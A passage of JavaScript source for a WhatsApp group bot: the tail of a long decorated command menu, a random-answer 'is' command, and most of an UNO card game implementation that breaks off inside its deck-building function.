┣◁️⚡💥 ${prefix}𝐛𝐥𝐮𝐬𝐡
┣◁️⚡💥 ${prefix}𝐬𝐦𝐮𝐠
┣◁️⚡💥 ${prefix}𝐠𝐥𝐨𝐦𝐩
┣◁️⚡💥 ${prefix}𝐡𝐚𝐩𝐩𝐲
┣◁️⚡💥 ${prefix}𝐝𝐚𝐧𝐜𝐞
┣◁️⚡💥 ${prefix}𝐜𝐫𝐢𝐧𝐠𝐞
┣◁️⚡💥 ${prefix}𝐡𝐢𝐠𝐡𝐟𝐢𝐯𝐞
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐄𝐌𝐎𝐉𝐈 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐥𝐚𝐮𝐠𝐡
┣◁️⚡💥 ${prefix}𝐬𝐡𝐲
┣◁️⚡💥 ${prefix}𝐬𝐚𝐝
┣◁️⚡💥 ${prefix}𝐤𝐢𝐬𝐬
┣◁️⚡💥 ${prefix}𝐦𝐨𝐨𝐧
┣◁️⚡💥 ${prefix}𝐚𝐧𝐠𝐞𝐫
┣◁️⚡💥 ${prefix}𝐡𝐚𝐩𝐩𝐲
┣◁️⚡💥 ${prefix}𝐜𝐨𝐧𝐟𝐮𝐬𝐞𝐝
┣◁️⚡💥 ${prefix}𝐡𝐞𝐚𝐫𝐭
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐆𝐀𝐌𝐄 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐜𝐥𝐚𝐧
┣◁️⚡💥 ${prefix}𝐰𝐞𝐫𝐞𝐰𝐨𝐥𝐟
┣◁️⚡💥 ${prefix}𝐰𝐚𝐫
┣◁️⚡💥 ${prefix}𝐦𝐬𝐩
┣◁️⚡💥 ${prefix}𝐮𝐧𝐨
┣◁️⚡💥 ${prefix}𝐠𝐢𝐯𝐞𝐚𝐰𝐚𝐲
┣◁️⚡💥 ${prefix}𝐛𝐥𝐚𝐜𝐤𝐣𝐚𝐜𝐤
┣◁️⚡💥 ${prefix}𝐭𝐢𝐜𝐭𝐚𝐜𝐭𝐨𝐞
┣◁️⚡💥 ${prefix}𝐰𝐫𝐠
┣◁️⚡💥 ${prefix}𝐰𝐜𝐠
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐔𝐒𝐄𝐑 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐚𝐟𝐤
┣◁️⚡💥 ${prefix}𝐬𝐞𝐫𝐯𝐞𝐫
┣◁️⚡💥 ${prefix}𝐝𝐢𝐬𝐤
┣◁️⚡💥 ${prefix}𝐥𝐨𝐨𝐤𝐮𝐩
┣◁️⚡💥 ${prefix}𝐩𝐢𝐧𝐠
┣◁️⚡💥 ${prefix}𝐚𝐥𝐢𝐯𝐞
┣◁️⚡💥 ${prefix}𝐬𝐲𝐬𝐭𝐞𝐦
┣◁️⚡💥 ${prefix}𝐫𝐮𝐧𝐭𝐢𝐦𝐞
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐭𝐨𝐩
┣◁️⚡💥 ${prefix}𝐟𝐚𝐜𝐭
┣◁️⚡💥 ${prefix}𝐟𝐥𝐢𝐩𝐜𝐨𝐢𝐧
┣◁️⚡💥 ${prefix}𝐫𝐚𝐭𝐞
┣◁️⚡💥 ${prefix}𝐫𝐢𝐳𝐳
┣◁️⚡💥 ${prefix}𝐟𝐥𝐢𝐫𝐭
┣◁️⚡💥 ${prefix}𝐩𝐢𝐜𝐤𝐮𝐩𝐥𝐢𝐧𝐞
┣◁️⚡💥 ${prefix}𝐣𝐨𝐤𝐞
┣◁️⚡💥 ${prefix}𝐬𝐡𝐢𝐩
┣◁️⚡💥 ${prefix}𝐝𝐚𝐫𝐞
┣◁️⚡💥 ${prefix}𝐭𝐫𝐮𝐭𝐡
┣◁️⚡💥 ${prefix}𝐭𝐫𝐢𝐯𝐢𝐚
┣◁️⚡💥 ${prefix}𝐚𝐧𝐬𝐰𝐞𝐫
┣◁️⚡💥 ${prefix}𝐬𝐜𝐨𝐫𝐞𝐛𝐨𝐚𝐫𝐝
┣◁️⚡💥 ${prefix}𝐡𝐨𝐫𝐨𝐬𝐜𝐨𝐩𝐞
┣◁️⚡💥 ${prefix}𝐬𝐭𝐮𝐩𝐢𝐝𝐜𝐡𝐞𝐜𝐤
┣◁️⚡💥 ${prefix}𝐠𝐚𝐲𝐜𝐡𝐞𝐜𝐤
┣◁️⚡💥 ${prefix}𝐰𝐚𝐢𝐟𝐮𝐜𝐡𝐞𝐜𝐤
┣◁️⚡💥 ${prefix}𝐡𝐨𝐭𝐜𝐡𝐞𝐜𝐤
┣◁️⚡💥 ${prefix}𝐮𝐧𝐜𝐥𝐞𝐚𝐧𝐜𝐨𝐞𝐜𝐤
┣◁️⚡💥 ${prefix}𝐞𝐯𝐢𝐥𝐜𝐡𝐞𝐜𝐤
┣◁️⚡💥 ${prefix}𝐬𝐦𝐚𝐫𝐭𝐜𝐡𝐞𝐜𝐤
┣◁️⚡💥 ${prefix}𝐬𝐨𝐮𝐥𝐦𝐚𝐭𝐞 <𝐭𝐚𝐠>
┣◁️⚡💥 ${prefix}𝐜𝐨𝐮𝐩𝐥𝐞 <𝐭𝐚𝐠>
┣◁️⚡💥 ${prefix}𝐰𝐡𝐚𝐭
┣◁️⚡💥 ${prefix}𝐰𝐡𝐞𝐫𝐞
┣◁️⚡💥 ${prefix}𝐰𝐡𝐞𝐧
┣◁️⚡💥 ${prefix}𝐢𝐬
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐕𝐎𝐈𝐂𝐄 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐛𝐚𝐬𝐬
┣◁️⚡💥 ${prefix}𝐛𝐥𝐨𝐰𝐧
┣◁️⚡💥 ${prefix}𝐝𝐞𝐞𝐩
┣◁️⚡💥 ${prefix}𝐞𝐚𝐫𝐫𝐚𝐩𝐞
┣◁️⚡💥 ${prefix}𝐟𝐚𝐬𝐭
┣◁️⚡💥 ${prefix}𝐟𝐚𝐭
┣◁️⚡💥 ${prefix}𝐧𝐢𝐠𝐡𝐭𝐜𝐨𝐫𝐞
┣◁️⚡💥 ${prefix}𝐫𝐞𝐯𝐞𝐫𝐬𝐞
┣◁️⚡💥 ${prefix}𝐫𝐨𝐛𝐨𝐭
┣◁️⚡💥 ${prefix}𝐬𝐥𝐨𝐰
┣◁️⚡💥 ${prefix}𝐬𝐦𝐨𝐨𝐭𝐡
┣◁️⚡💥 ${prefix}𝐬𝐪𝐮𝐢𝐫𝐫𝐞𝐥
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐚𝐝𝐝 <𝐭𝐚𝐠𝐬>
┣◁️⚡💥 ${prefix}𝐤𝐢𝐜𝐤 <𝐭𝐚𝐠𝐬>
┣◁️⚡💥 ${prefix}𝐫𝐞𝐦𝐨𝐯𝐞 <𝐜𝐨𝐮𝐧𝐭𝐫𝐲 𝐜𝐨𝐝𝐞>
┣◁️⚡💥 ${prefix}𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞
┣◁️⚡💥 ${prefix}𝐭𝐚𝐠𝐚𝐥𝐥
┣◁️⚡💥 ${prefix}𝐥𝐞𝐚𝐯𝐞𝐠𝐜
┣◁️⚡💥 ${prefix}𝐣𝐨𝐢𝐧
┣◁️⚡💥 ${prefix}𝐢𝐧𝐯𝐢𝐭𝐞
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭𝐧𝐚𝐦𝐞
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭𝐝𝐞𝐬𝐜𝐠𝐜
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭𝐩𝐩𝐠𝐜
┣◁️⚡💥 ${prefix}𝐬𝐞𝐭𝐩𝐩𝐠𝐜
┣◁️⚡💥 ${prefix}𝐬𝐯𝐜𝐨𝐧𝐭𝐚𝐜𝐭
┣◁️⚡💥 ${prefix}𝐥𝐢𝐬𝐭𝐨𝐧𝐥𝐢𝐧𝐞
┣◁️⚡💥 ${prefix}𝐨𝐩𝐞𝐧𝐠𝐫𝐨𝐮𝐩
┣◁️⚡💥 ${prefix}𝐜𝐥𝐨𝐬𝐞𝐠𝐫𝐨𝐮𝐩
┣◁️⚡💥 ${prefix}𝐥𝐢𝐧𝐤𝐠𝐜
┣◁️⚡💥 ${prefix}𝐫𝐞𝐬𝐞𝐭𝐥𝐢𝐧𝐤
┣◁️⚡💥 ${prefix}𝐜𝐫𝐞𝐚𝐭𝐞𝐠𝐜
┣◁️⚡💥 ${prefix}𝐡𝐢𝐝𝐞𝐭𝐚𝐠
┣◁️⚡💥 ${prefix}𝐩𝐫𝐨𝐦𝐨𝐭𝐞 <𝐭𝐚𝐠𝐬>
┣◁️⚡💥 ${prefix}𝐝𝐞𝐦𝐨𝐭𝐞 <𝐭𝐚𝐠𝐬>
┣◁️⚡💥 ${prefix}𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐚𝐥𝐥 <𝐭𝐚𝐠𝐬>
┣◁️⚡💥 ${prefix}𝐝𝐞𝐦𝐨𝐭𝐎𝐚𝐥𝐥 <𝐭𝐚𝐠𝐬>
┣◁️⚡💥 ${prefix}𝐤𝐢𝐜𝐤𝐚𝐥𝐥 <𝐭𝐚𝐠𝐬>
┣◁️⚡💥 ${prefix}𝐰𝐚𝐫𝐧 <𝐭𝐚𝐠𝐬>
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐏𝐇𝐎𝐗𝐘 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐬𝐡𝐚𝐝𝐨𝐰
┣◁️⚡💥 ${prefix}𝐫𝐨𝐦𝐚𝐧𝐭𝐢𝐜
┣◁️⚡💥 ${prefix}𝐰𝐫𝐢𝐭𝐞
┣◁️⚡💥 ${prefix}𝐛𝐮𝐫𝐧𝐩𝐚𝐩𝐞𝐫
┣◁️⚡💥 ${prefix}𝐬𝐦𝐨𝐤𝐞
┣◁️⚡💥 ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨𝐛𝐚𝐧𝐧𝐞𝐫
┣◁️⚡💥 ${prefix}𝐥𝐨𝐯𝐞
┣◁️⚡💥 ${prefix}𝐮𝐧𝐝𝐞𝐫𝐠𝐫𝐚𝐬𝐬
┣◁️⚡💥 ${prefix}𝐝𝐨𝐮𝐛𝐥𝐞𝐥𝐨𝐯𝐞
┣◁️⚡💥 ${prefix}𝐜𝐨𝐟𝐟𝐞𝐞𝐜𝐮𝐩
┣◁️⚡💥 ${prefix}𝐮𝐨𝐝𝐞𝐫𝐰𝐚𝐭𝐞𝐫𝐨𝐜𝐞𝐚𝐧
┣◁️⚡💥 ${prefix}𝐬𝐦𝐨𝐤𝐲𝐧𝐞𝐨𝐧
┣◁️⚡💥 ${prefix}𝐬𝐭𝐚𝐫𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐛𝐚𝐥𝐥𝐨𝐧𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐫𝐚𝐢𝐧𝐛𝐨𝐰𝐞𝐟𝐟𝐞𝐜𝐭
┣◁️⚡💥 ${prefix}𝐦𝐞𝐭𝐚𝐥𝐥𝐢𝐜𝐞𝐟𝐟𝐞𝐜𝐭
┣◁️⚡💥 ${prefix}𝐞𝐦𝐛𝐫𝐨𝐢𝐝𝐞𝐫𝐲𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐬𝐭𝐨𝐧𝐞𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐟𝐥𝐚𝐦𝐢𝐧𝐠𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐰𝐫𝐢𝐭𝐞𝐚𝐫𝐭𝐬
┣◁️⚡💥 ${prefix}𝐬𝐮𝐦𝐦𝐞𝐫𝐭𝐞𝐱𝐭𝐓
┣◁️⚡💥 ${prefix}𝐧𝐚𝐭𝐮𝐫𝐞𝟑𝐝𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐫𝐨𝐬𝐞𝐬𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐰𝐨𝐥𝐟𝐦𝐞𝐭𝐚𝐥𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐧𝐚𝐭𝐮𝐫𝐚𝐥𝐭𝐲𝐩𝐨𝐠𝐫𝐚𝐩𝐡𝐲
┣◁️⚡💥 ${prefix}𝐬𝐡𝐢𝐧𝐞𝐭𝐞𝐱𝐭𝐬
┣◁️⚡💥 ${prefix}𝐪𝐮𝐨𝐭𝐞𝐬𝐮𝐧𝐝𝐞𝐫
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐒𝐓𝐀𝐋𝐊 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐠𝐢𝐭𝐡𝐮𝐛𝐬𝐭𝐚𝐥𝐤
┣◁️⚡💥 ${prefix}𝐢𝐠𝐬𝐭𝐚𝐥𝐤
┣◁️⚡💥 ${prefix}𝐭𝐢𝐤𝐭𝐨𝐤𝐬𝐭𝐚𝐥𝐤
┣◁️⚡💥 ${prefix}𝐟𝐟𝐬𝐭𝐚𝐥𝐤
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐕𝐈𝐃𝐄𝐎 𝐋𝐎𝐆𝐎 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐥𝐨𝐠𝐨𝐢𝐧𝐭𝐫𝐨
┣◁️⚡💥 ${prefix}𝐞𝐥𝐞𝐠𝐚𝐧𝐭
┣◁️⚡💥 ${prefix}𝐩𝐮𝐛𝐠
┣◁️⚡💥 ${prefix}𝐭𝐢𝐠𝐞𝐫
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐏𝐇𝐎𝐓𝐎 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐠𝐥𝐢𝐭𝐜𝐡𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐰𝐫𝐢𝐭𝐞𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐚𝐝𝐯𝐚𝐧𝐜𝐞𝐝𝐠𝐥𝐨𝐰
┣◁️⚡💥 ${prefix}𝐭𝐲𝐩𝐨𝐠𝐫𝐚𝐩𝐡𝐲𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐩𝐢𝐱𝐞𝐥𝐠𝐥𝐢𝐭𝐜𝐡
┣◁️⚡💥 ${prefix}𝐧𝐞𝐨𝐧𝐠𝐥𝐢𝐭𝐜𝐡
┣◁️⚡💥 ${prefix}𝐟𝐥𝐚𝐠𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐟𝐥𝐚𝐠𝟑𝐝𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐝𝐞𝐥𝐞𝐭𝐢𝐧𝐠𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐛𝐥𝐚𝐜𝐤𝐩𝐢𝐧𝐤𝐬𝐭𝐲𝐥𝐞
┣◁️⚡💥 ${prefix}𝐠𝐥𝐨𝐰𝐢𝐧𝐠𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐮𝐧𝐝𝐞𝐫𝐰𝐚𝐭𝐞𝐫𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐥𝐨𝐠𝐨𝐦𝐚𝐤𝐞𝐫
┣◁️⚡💥 ${prefix}𝐜𝐚𝐫𝐭𝐨𝐨𝐧𝐬𝐭𝐲𝐥𝐞
┣◁️⚡💥 ${prefix}𝐩𝐚𝐩𝐞𝐫𝐜𝐮𝐭𝐬𝐭𝐲𝐥𝐞
┣◁️⚡💥 ${prefix}𝐰𝐚𝐭𝐞𝐫𝐜𝐨𝐥𝐨𝐫𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐞𝐟𝐟𝐞𝐜𝐭𝐜𝐥𝐨𝐮𝐝
┣◁️⚡💥 ${prefix}𝐛𝐥𝐚𝐜𝐤𝐩𝐢𝐧𝐤𝐥𝐨𝐠𝐨
┣◁️⚡💥 ${prefix}𝐠𝐫𝐚𝐝𝐢𝐞𝐧𝐭𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐥𝐮𝐱𝐮𝐫𝐲𝐠𝐨𝐥𝐝
┣◁️⚡💥 ${prefix}𝐬𝐚𝐧𝐝𝐬𝐮𝐦𝐦𝐞𝐫
┣◁️⚡💥 ${prefix}𝐦𝐮𝐥𝐭𝐢𝐜𝐨𝐥𝐨𝐫𝐞𝐝𝐧𝐞𝐨𝐧
┣◁️⚡💥 ${prefix}𝐦𝐚𝐤𝐢𝐧𝐠𝐧𝐞𝐨𝐧
┣◁️⚡💥 ${prefix}𝐠𝐚𝐥𝐚𝐱𝐲𝐰𝐚𝐥𝐥𝐩𝐚𝐩𝐞𝐫
┣◁️⚡💥 ${prefix}𝟏𝟗𝟏𝟕𝐬𝐭𝐲𝐥𝐞
┣◁️⚡💥 ${prefix}𝐟𝐫𝐞𝐞𝐜𝐫𝐞𝐚𝐭𝐞
┣◁️⚡💥 ${prefix}𝐠𝐚𝐥𝐚𝐱𝐲𝐬𝐭𝐲𝐥𝐞
┣◁️⚡💥 ${prefix}𝐥𝐢𝐠𝐡𝐭𝐞𝐟𝐟𝐞𝐜𝐭𝐬
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐌𝐄𝐌𝐔
┣◁️⚡💥 ${prefix}𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐬𝐞𝐥𝐟
┣◁️⚡💥 ${prefix}𝐛𝐚𝐧𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥
┣◁️⚡💥 ${prefix}𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭
┣◁️⚡💥 ${prefix}𝐟𝐟𝐓𝐚𝐥𝐤
┣◁️⚡💥 ${prefix}𝐭𝐞𝐦𝐩𝐦𝐚𝐢𝐥
┣◁️⚡💥 ${prefix}𝐜𝐡𝐞𝐜𝐤𝐦𝐚𝐢𝐥
┣◁️⚡💥 ${prefix}𝐝𝐞𝐥𝐦𝐚𝐢𝐥
┣◁️⚡💥 ${prefix}𝐬𝐮𝐫𝐞𝐨𝐝𝐝𝐬
┣◁️⚡💥 ${prefix}𝐩𝐫𝐞𝐝𝐢𝐜𝐭𝐢𝐨𝐧
┣◁️⚡💥 ${prefix}𝐫𝐢𝐳𝐳
┣◁️⚡💥 ${prefix}𝐩𝐢𝐜𝐤𝐮𝐩𝐥𝐢𝐧𝐞
┣◁️⚡💥 ${prefix}𝐬𝐩𝐨𝐫𝐭𝐬𝐧𝐞𝐰𝐬
┣◁️⚡💥 ${prefix}𝐥𝐢𝐯𝐞𝐬𝐜𝐨𝐫𝐞𝐬
┣◁️⚡💥 ${prefix}𝐭𝐢𝐧𝐲𝐮𝐫𝐥
┣◁️⚡💥 ${prefix}𝐥𝐢𝐬𝐭𝐜𝐮𝐫𝐫𝐞𝐧𝐜𝐲
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭𝐧𝐞𝐰𝐠𝐥𝐞𝐭𝐭𝐞𝐫
┣◁️⚡💥 ${prefix}𝐜𝐫𝐞𝐚𝐭𝐞𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐮𝐩𝐝𝐎𝐭𝐞𝐝𝐞𝐬𝐜
┣◁️⚡💥 ${prefix}𝐮𝐩𝐝𝐚𝐭𝐞𝐧𝐚𝐦𝐞
┣◁️⚡💥 ${prefix}𝐮𝐩𝐝𝐚𝐭𝐞𝐩𝐢𝐜
┣◁️⚡💥 ${prefix}𝐫𝐞𝐦𝐨𝐯𝐞𝐩𝐢𝐜
┣◁️⚡💥 ${prefix}𝐟𝐨𝐥𝐥𝐨𝐰𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐮𝐧𝐟𝐨𝐥𝐥𝐨𝐰𝐜𝐡𝐚𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐝𝐞𝐥𝐞𝐭𝐞𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐦𝐮𝐭𝐞𝐧𝐞𝐰𝐬
┣◁️⚡💥 ${prefix}𝐮𝐧𝐦𝐮𝐭𝐞𝐧𝐞𝐰𝐬
┣◁️⚡💥 ${prefix}𝐭𝐞𝐦𝐩𝐚𝐝𝐦𝐢𝐧
┣◁️⚡💥 ${prefix}𝐚𝐜𝐭𝐢𝐯𝐢𝐭𝐲
┣◁️⚡💥 ${prefix}𝐩𝐨𝐥𝐥
┣◁️⚡💥 ${prefix}𝐜𝐨𝐥𝐨𝐫
┣◁️⚡💥 ${prefix}𝐩𝐨𝐬𝐭
┣◁️⚡💥 ${prefix}𝐫𝐞𝐩𝐨𝐬𝐭
┣◁️⚡💥 ${prefix}𝐰𝐞𝐛𝐭𝐨𝐨𝐧
┣◁️⚡💥 ${prefix}𝐜𝐞𝐫𝐩𝐞𝐧
┣◁️⚡💥 ${prefix}𝐟𝐝𝐫𝐨𝐢𝐝
┣◁️⚡💥 ${prefix}𝐬𝐭𝐲𝐥𝐞 / 𝐬𝐭𝐲𝐥𝐞𝐭𝐞𝐱𝐭
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: mainMenu }, { quoted: m });
    break;
 // V3  COMS
case 'is': {
    if (!text) return replyphistar(`Ask question\n\nExample : ${prefix + command} she a virgin?`);
    let apa = [`Yes`, `No`, `It Could Be`, `Thats right`];
    let kah = apa[Math.floor(Math.random() * apa.length)];
    let jawab = `*Is ${text}*\nAnswer : ${kah}`;
    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: jawab
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'Generated'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: ('https://i.pinimg.com/564x/f1/c5/4c/f1c54c7c334a1845a2f48c36f79f10a6.jpg') }, { upload: PhistarBotInc.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
                        }],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '',
                            newsletterName: '',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });
    return await PhistarBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

case "uno": {
    if (!m.isGroup) {
        return replyphistar("This command can only be used in group chats.");
    }
    const games = readUnoGameData();
    const args = text.split(' ');
    const command = args[0];
    const subCommand = args.slice(1).join(' ');

    if (!games[m.chat]) {
        games[m.chat] = {
            players: [],
            deck: createDeck(),
            discardPile: [],
            currentPlayer: 0,
            direction: 1,
            currentCard: null,
            drawStack: 0,
            blockCardPlayed: false,
            reverseCardPlayed: false,
            stopVotes: new Set(),
            awaitingColorChoice: false
        };
        writeUnoGameData(games);
        return replyphistar("UNO game started! Type 'uno join' to join.");
    }

    const game = games[m.chat];

    switch (command) {
        case "join":
            if (game.players.find(player => player.id === m.sender)) {
                return replyphistar("You have already joined the game.");
            }
            game.players.push({ id: m.sender, hand: [] });
            writeUnoGameData(games);
            return replyphistar("You have joined the UNO game!");

        case "start":
            if (game.players.length < 2) {
                return replyphistar("At least 2 players are required to start the game.");
            }
            game.deck = shuffle(game.deck);
            game.players.forEach(player => {
                for (let i = 0; i < 7; i++) {
                    player.hand.push(game.deck.pop());
                }
            });
            game.currentCard = game.deck.pop();
            game.discardPile.push(game.currentCard);
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "info":
            return replyphistar(`
UNO Rules and How to Play:

1. Join the game:
   - Use \`uno join\` to join the game.
   - Use \`uno start\` to start the game after at least 2 players have joined.

2. Draw a card:
   - Use \`uno draw\` to draw a card from the deck. If a special card forces you to draw cards, you will draw all required cards.

3. Play a card:
   - Use \`uno play <card_index>\` to play a card. The card must match the color or number of the card on the discard pile, or you can use a black card to change the color.
   - Special cards:
     - \`12\`: The next player draws two cards and is skipped.
     - \`14\`: The next player draws four cards and is skipped.
     - \`10\`: The next player is skipped.
     - \`11\`: The play direction is reversed.
     - \`wild13\`: The player chooses a new color.
     - \`wild14\`: The next player draws four cards and is skipped.

4. Skip a turn:
   - Use \`uno pass\` if you cannot or do not want to play a card on your turn.

5. Check your hand:
   - Use \`uno hand\` to see the cards in your hand.

6. Check the card image:
   - Use \`uno card <card_index>\` to check the image of the card in your hand.

7. End the game:
   - The first player to use all their cards wins the game.

8. Stop the game:
   - Use \`uno stop\` to request to stop the game. All players must agree, or an admin/creator can stop the game directly.
`);

        case "stop":
            const player = game.players.find(p => p.id === m.sender);
            if (!player) {
                return replyphistar("You have not joined the game.");
            }

            if (isAdmins || isCreator) {
                delete games[m.chat];
                writeUnoGameData(games);
                return replyphistar("UNO game stopped by admin/creator.");
            }

            game.stopVotes.add(m.sender);
            if (game.stopVotes.size === game.players.length) {
                delete games[m.chat];
                writeUnoGameData(games);
                return replyphistar("UNO game stopped with all players' agreement.");
            }

            writeUnoGameData(games);
            return replyphistar(`Stop request accepted. ${game.players.length - game.stopVotes.size} more players need to agree.`);

        case "hand":
            const playerHand = game.players.find(p => p.id === m.sender);
            if (!playerHand) {
                return replyphistar("You have not joined the game.");
            }
            const hand = playerHand.hand.map((card, index) => `${index}: ${card.color} ${card.value}`).join("\n");
            const iniHandText = `*Uno Game PhistarBotInc*\n_still under construction_\n\nYour Cards:\n${hand}`;
            await PhistarBotInc.sendMessage(m.sender, { text: iniHandText }, { quoted: m });
            return replyphistar('Check your cards!');

        case "card":
            const cardIndex = parseInt(subCommand);
            if (isNaN(cardIndex) || cardIndex < 0 || cardIndex >= game.players.find(p => p.id === m.sender).hand.length) {
                return replyphistar("Invalid card.");
            }
            const card = game.players.find(p => p.id === m.sender).hand[cardIndex];
            const cardImageUrl = getCardImageUrl(card);
            const cardText = `${card.color} ${card.value}`;
            await PhistarBotInc.sendMessage(m.sender, { image: { url: cardImageUrl }, caption: cardText }, { quoted: m });
            return replyphistar('Card image sent!');

        case "play":
            const currentPlayer = game.players[game.currentPlayer];
            if (currentPlayer.id !== m.sender) {
                return replyphistar("It's not your turn!");
            }

            const playCardIndex = parseInt(subCommand);
            if (isNaN(playCardIndex) || playCardIndex < 0 || playCardIndex >= currentPlayer.hand.length) {
                return replyphistar("Invalid card.");
            }

            const playCard = currentPlayer.hand[playCardIndex];
            if (!isValidPlay(game.currentCard, playCard)) {
                return replyphistar("The card cannot be played.");
            }

            if (playCard.value === "12") {
                game.drawStack += 2;
            } else if (playCard.value === "wild14") {
                if (hasPlayableCard(currentPlayer, game.currentCard)) {
                    return replyphistar("The Wild Draw Four card can only be played if you have no matching card.");
                }
                game.drawStack += 4;
                game.currentCard.color = "black";
                game.awaitingColorChoice = true;
            } else if (playCard.value === "10") {
                game.currentPlayer = getNextPlayer(game);
            } else if (playCard.value === "11") {
                game.direction *= -1;
            }

            game.currentCard = playCard;
            game.discardPile.push(playCard);
            currentPlayer.hand.splice(playCardIndex, 1);

            if (currentPlayer.hand.length === 0) {
                delete games[m.chat];
                writeUnoGameData(games);
                return replyphistar(`Player ${m.sender} wins!`);
            }

            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "pass":
            const passPlayer = game.players[game.currentPlayer];
            if (passPlayer.id !== m.sender) {
                return replyphistar("It's not your turn!");
            }
            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "color":
            if (!game.awaitingColorChoice || game.players[game.currentPlayer].id !== m.sender) {
                return replyphistar("No color needs to be selected at this time.");
            }

            const chosenColor = subCommand.trim().toLowerCase();
            if (!["red", "yellow", "green", "blue"].includes(chosenColor)) {
                return replyphistar("Invalid color. Choose one of: red, yellow, green, blue.");
            }

            game.currentCard.color = chosenColor;
            game.awaitingColorChoice = false;
            game.currentPlayer = getNextPlayer(game);
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        default:
            return replyphistar("Command not recognized. Use `uno info` to view the list of commands.");
    }

    function createDeck() {
        const colors = ["red", "yellow", "green", "blue"];
        const values = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"];
        const deck = [];
        colors.forEach(color => {
            values.forEach(value => {
                deck.push({ color, value });
                if (value !== "1") deck.push({ color, value });
            });
        });
        ["wild13", "wild14"].forEach(value => {
            deck.push({ color: "black", value });
